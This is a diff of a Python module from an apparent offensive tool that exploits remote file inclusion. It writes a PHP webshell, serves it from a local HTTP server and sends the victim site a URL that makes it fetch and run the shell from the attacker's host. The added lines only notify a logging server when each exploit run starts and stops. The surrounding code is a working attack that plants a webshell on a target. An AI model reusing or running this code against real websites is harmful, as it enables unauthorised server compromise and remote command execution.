@@ -1,4 +1,4 @@
-import sys, os, urllib.request, subprocess, random, socket, threading, time
+import sys, os, urllib.request, subprocess, random, socket, threading, time, requests
 from . import create_webshell
 
 class color:
@@ -62,6 +62,14 @@ def RFI(victim_info, attacker_info, general_info, arguments):
 		store_webshell = open(script_dir + 'my_webshell.php', 'wb')
 		store_webshell.write(webshell)
 		store_webshell.close()
+		
+		try:
+			# The pid here is random, we dont really to specify it
+			requests.get('http://'+ informAudittingStart(general_info), timeout=(1,1)) 
+		except requests.exceptions.ReadTimeout:
+		    		pass
+		except requests.exceptions.ConnectTimeout:
+		    	sys.exit(color.RED + '[-] Failed to connect to Logging server' + color.END)
 
 		# Interactive option
 		print('\n' + color.RED + 'KEEP THIS SCRIPT RUNNING WHILE USING THE WEBSHELL' + color.END +'\n\n')
@@ -72,6 +80,13 @@ def RFI(victim_info, attacker_info, general_info, arguments):
 		except KeyboardInterrupt:
 			print('\n[+] Exiting...')
 			os.remove(script_dir + 'my_webshell.php')
+			try:
+				# The pid here is random, we dont really to specify it
+				requests.get('http://'+ informAudittingStop(general_info), timeout=(1,1)) 
+			except requests.exceptions.ReadTimeout:
+		    		pass
+			except requests.exceptions.ConnectTimeout:
+		    		sys.exit(color.RED + '[-] Failed to connect to Logging server' + color.END)
 
 	else:
 		# Create and start download server to allow the victim website to fetch our file
@@ -83,10 +98,25 @@ def RFI(victim_info, attacker_info, general_info, arguments):
 		
 		# Wait for the python server to open
 		time.sleep(1)
+		try:
+			requests.get('http://'+ informAudittingStart(general_info), timeout=(1,1)) 
+		except requests.exceptions.ReadTimeout:
+		    	pass
+		except requests.exceptions.ConnectTimeout:
+		    	sys.exit(color.RED + '[-] Failed to connect to Logging server' + color.END)
+		    
 		url = 'http' + s + '://' + v_ip + ':' + v_port + v_rec_path + 'http://' + a_ip + ':' + str(random_port) + '/FileInclusion/my_webshell.php'
+		
 		urllib.request.urlopen(url)
 		# Give time for webshell to execute the commands
 		time.sleep(1)
+		
+		try:
+			requests.get('http://'+ informAudittingStop(general_info), timeout=(1,1)) 
+		except requests.exceptions.ReadTimeout:
+		    	pass
+		except requests.exceptions.ConnectTimeout:
+		    	sys.exit(color.RED + '[-] Failed to connect to Logging server' + color.END)
 		os.remove(script_dir + 'my_webshell.php')
 		
 
@@ -110,3 +140,17 @@ def check_port(ip, port):
 	
 def task(random_port):
 	subprocess.Popen('python3 -m http.server ' + str(random_port) + ' 1>/dev/null 2>/dev/null', shell=True)
+
+
+def informAudittingStart(general_info):
+	exploit = 'FileInclusion'
+	# Pid is added on the terminal using $(echo $$)
+	url = general_info['host'] + ':' + general_info['port'] + '/start?exploit=' + exploit 
+	return url
+
+def informAudittingStop(general_info):
+	exploit = 'FileInclusion'
+	# Pid is added on the terminal using $(echo $$)
+	url = general_info['host'] + ':' + general_info['port'] + '/stop?exploit=' + exploit 
+	return url
+
